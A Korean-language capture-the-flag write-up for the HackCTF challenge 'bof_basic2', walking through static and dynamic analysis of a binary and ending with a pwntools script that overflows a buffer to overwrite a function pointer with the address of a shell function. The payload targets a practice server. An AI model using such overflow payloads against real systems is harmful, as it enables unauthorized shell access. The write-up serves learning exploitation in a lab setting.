

## [HackCTF] bof_basic2

---



### 0x00. Binary Analysis (static)

---

![image](https://user-images.githubusercontent.com/33051018/75606869-94bc0b00-5b34-11ea-850f-1787e893f0d3.png)

`file` 명령어를 통해 바이너리 정보 습득.

![image](https://user-images.githubusercontent.com/33051018/75606917-39d6e380-5b35-11ea-829d-65c7d8f589ea.png)

`checksec` 스크립트를 통해 바이너리에 적용된 보호기법 확인.

![image](https://user-images.githubusercontent.com/33051018/75606939-7dc9e880-5b35-11ea-84b5-1b9c22aa50da.png)

`info func` 명령어를 실행시켜보니 `shell`, `sup` 이라는 이상한 함수들이 있다, 일단 참고하도록 함.



### 0x01. Binary Analysis (Dynamic)

---

일단 바이너리를 실행시켜보도록 한다.

![image](https://user-images.githubusercontent.com/33051018/75606979-e5803380-5b35-11ea-83bb-15a11db1b0fb.png)

이전 문제와 비슷한 흐름이다.

실행하자마자 입력을 받고 이후에 일련의 문자열을 출력한다.

메인 함수를 살펴본다.

![image](https://user-images.githubusercontent.com/33051018/75606954-a7830f80-5b35-11ea-9854-27cefb85d59d.png)

`main` 함수를 `disassemble` 하면 위와 같은 모습을 확인할 수 있으며 메인의 구성은 매우 간단했다.

주요 `instruction`에 대해서만 설명을 진행하겠다.

`main+41~48` : `eax` 레지스터에 `ebp-0x8c` 의 주소값을 담고 `eax`를 `push` 하여 `fgets`함수의 인자로 사용한다.
즉, 입력을 받는 버퍼의 위치의 시작주소는 `ebp-0x8c` 다.

`main+56~59` : `eax` 레지스터에 `ebp-0xc`의 주소값을 담고 `eax`를 `call` 한다.

**즉, `ebp-0xc` 가 참조하는 값을 호출하는 로직이며 이를 이용하면 다른 함수를 호출할 수 있다.**

이를 이용하여 문제를 풀기 위해서는 쉘을 실행시켜주는 함수가 필요하다.

현재 `ebp-0xc`가 참조하고 있는 값을 확인해본다.

![image](https://user-images.githubusercontent.com/33051018/75607761-c08fbe80-5b3d-11ea-89f1-362491f37a73.png)

`0x080484b4` 주소를 참조하고 있었다. 이것이 무엇인지 확인해본다.

![image](https://user-images.githubusercontent.com/33051018/75607797-02206980-5b3e-11ea-99ed-ac3046196a60.png)

처음에 `info func` 명령어를 통해 확인했던 함수들 중 `sup` 함수이다.

그렇다면, 이름부터 의미심장했던 `shell` 함수를 살펴보자.

![image](https://user-images.githubusercontent.com/33051018/75607836-47dd3200-5b3e-11ea-9050-795ee6c2e02e.png)

예상대로 쉘을 열어주는 함수이다.

이제 `exploit`을 위한 모든 준비는 끝났다.

버퍼 입력위치로 부터 `ebp-0xc`까지 더미로 채욱고, `shell`함수의 주소를 `append`해줘 페이로드를 구성한다.



### 0x02. Exploit

---

```python
from pwn import *

#p = process('./bof_basic2')				# local
p = remote('ctf.j0n9hyun.xyz', 3001)		# remote

shell_addr = 0x804849b						# shell func addr

payload = 'A' * (0x8c - 0xc)				# dummy
payload += p32(shell_addr)

p.sendline(payload)

p.interactive()
```



**Result**

---

![image](https://user-images.githubusercontent.com/33051018/75608048-83c4c700-5b3f-11ea-8d1b-2b4294490a13.png)

